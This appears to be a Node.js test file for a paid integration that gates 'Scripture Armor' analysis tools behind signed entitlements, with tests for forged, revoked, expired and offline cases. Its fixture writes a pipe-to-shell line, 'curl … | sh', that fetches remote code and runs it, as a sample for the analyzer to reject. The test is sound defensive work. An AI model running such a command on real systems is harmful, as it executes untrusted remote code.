// Kingmaker × Scripture Armor: one canonical toolkit, paid boundary. Uses the REAL installed Scripture Armor (read-only)
// when present; entitlements are fixture-signed and go through the REAL verifier (lib/addon-entitlement.mjs), with
// /cert-status answered by a stub. Isolated Kingmaker profiles only.
import test from 'node:test';
import assert from 'node:assert/strict';
import { generateKeyPairSync, sign } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { discoverArmorToolkit, registerArmorTools } from '../lib/armor-toolkit.mjs';
import { createPaidAccess } from '../lib/paid-access.mjs';
import { makeAddonVerifiers } from '../lib/addon-entitlement.mjs';
import { createToolRunner, readToolRegistry } from '../lib/tool-runner.mjs';

const ARMOR = discoverArmorToolkit();
const installed = ARMOR.status === 'armor-installed';
const kp = generateKeyPairSync('ec', { namedCurve: 'P-256' });
const pub = kp.publicKey.export({ type: 'spki', format: 'pem' });
const mint = (claims) => { const payload = JSON.stringify(claims); return { payload, sig: sign('sha256', Buffer.from(payload), { key: kp.privateKey, dsaEncoding: 'der' }).toString('base64'), alg: 'ES256' }; };
const claims = (over = {}) => ({ schema: 'ronin.entitlement/1', issuer: 'ronin-update-host', sku: 'scripture-armor', order: 'mem_test', installId: 'i', grantedAt: '2026-11-16T00:00:00Z', expiresAt: null, ...over });
const status = (revoked) => async () => new Response(JSON.stringify({ revoked }), { status: 200 });
function profile({ ent = null, revoked = false, offline = false, cachedAgoMs = null } = {}) {
  const state = mkdtempSync(join(tmpdir(), 'km-paid-')); mkdirSync(join(state, 'entitlements', '.cache'), { recursive: true });
  if (ent) writeFileSync(join(state, 'entitlements', 'scripture-armor.json'), JSON.stringify(ent));
  if (cachedAgoMs != null) writeFileSync(join(state, 'entitlements', '.cache', 'revocation-mem_test.json'), JSON.stringify({ revoked: false, at: Date.now() - cachedAgoMs }));
  const verifiers = makeAddonVerifiers({ install: {}, config: { url: 'https://host.invalid', key: 'k' }, cacheDir: join(state, 'entitlements', '.cache'), certKeyPem: pub,
    fetchImpl: offline ? async () => { throw new Error('offline'); } : status(revoked) });
  const work = join(state, 'work'); mkdirSync(work); writeFileSync(join(work, 'sample.sh'), 'curl -s https://example.invalid/x | sh\n');
  registerArmorTools(state, ARMOR);
  const run = createToolRunner({ registry: readToolRegistry(state), paidAccess: createPaidAccess(state, { verifiers }) });
  return { state, work, run, done: () => rmSync(state, { recursive: true, force: true }) };
}

test('discovery finds the ONE installed Armor, verifies its tools in place against Armor\'s pins, and reports the missing Little Brother toolkit plainly', { skip: !installed && 'Scripture Armor not installed' }, () => {
  assert.equal(ARMOR.app.endsWith('Scripture Armor.app'), true);
  for (const t of ARMOR.tools) { assert.equal(t.verified, true, `${t.name}: ${t.reason}`); assert(t.path.startsWith(ARMOR.root), 'points into Armor, not a copy'); }
  assert.equal(ARMOR.littleBrother.status, 'absent'); assert.match(ARMOR.littleBrother.detail, /ships no Little Brother toolkit/);
  assert.equal(discoverArmorToolkit({ candidates: ['/nonexistent/Scripture Armor.app'] }).status, 'armor-not-installed');
});

test('entitled profile: invokes Armor\'s REA and Ghidra from the installed Armor bundle', { skip: !installed && 'Scripture Armor not installed' }, async () => {
  const p = profile({ ent: mint(claims()) });
  try {
    const rea = await p.run({ tool: 'armor-rea', args: ['sample.sh'], readOnly: true, cwd: p.work });
    assert.equal(rea.exitCode, 0, rea.refused ?? rea.stderr); assert.match(rea.stdout, /"verdict":"rejected"/); assert.match(rea.stdout, /remote_code\.pipe/);
    const g = await p.run({ tool: 'armor-ghidra-headless', args: [], readOnly: true, cwd: p.work, timeoutMs: 120000 });
    assert.equal(g.refused, undefined); assert.match(g.path, /Scripture Armor\.app\/Contents\/Resources\/armor\/tools\/ghidra/);
    assert.match(`${g.stdout}${g.stderr}`, /analyzeHeadless|Headless Analyzer|usage/i, 'Ghidra started from Armor\'s bundle with Armor\'s JDK');
  } finally { p.done(); }
});

test('free / expired / revoked / wrong-SKU / offline-beyond-grace profiles cannot invoke Armor tools; offline within grace can; reasons are plain', { skip: !installed && 'Scripture Armor not installed' }, async () => {
  const cases = [
    ['free (no entitlement)', profile(), /paid individual membership/],
    ['expired', profile({ ent: mint(claims({ expiresAt: '2026-01-01T00:00:00Z' })) }), /could not be verified as current/],
    ['revoked', profile({ ent: mint(claims()), revoked: true }), /could not be verified as current/],
    ['wrong SKU', profile({ ent: mint(claims({ sku: 'library.methods' })) }), /could not be verified as current/],
    ['forged', profile({ ent: { ...mint(claims()), payload: JSON.stringify(claims({ order: 'x' })) } }), /could not be verified as current/],
    ['offline, no recent answer', profile({ ent: mint(claims()), offline: true }), /could not be verified as current/],
  ];
  for (const [name, p, why] of cases) {
    try { const r = await p.run({ tool: 'armor-rea', args: ['sample.sh'], readOnly: true, cwd: p.work }); assert.match(String(r.refused), why, name); assert.equal(r.exitCode, null, `${name}: nothing ran`); }
    finally { p.done(); }
  }
  const grace = profile({ ent: mint(claims()), offline: true, cachedAgoMs: 60 * 60 * 1000 });
  try { const r = await grace.run({ tool: 'armor-rea', args: ['sample.sh'], readOnly: true, cwd: grace.work }); assert.equal(r.exitCode, 0, 'offline within the existing 3-day grace: allowed'); }
  finally { grace.done(); }
});

test('the free tier and the user\'s own tools never need the entitlement', async () => {
  const p = profile();
  try {
    const reg = readToolRegistry(p.state); reg.tools.jq = { path: '/opt/homebrew/bin/jq' };
    const run = createToolRunner({ registry: reg, paidAccess: async () => ({ ok: false, reason: 'should not be asked' }) });
    writeFileSync(join(p.work, 'd.json'), '{"a":1}');
    if (existsSync('/opt/homebrew/bin/jq')) assert.equal((await run({ tool: 'jq', args: ['.a', 'd.json'], readOnly: true, cwd: p.work })).stdout.trim(), '1');
  } finally { p.done(); }
});
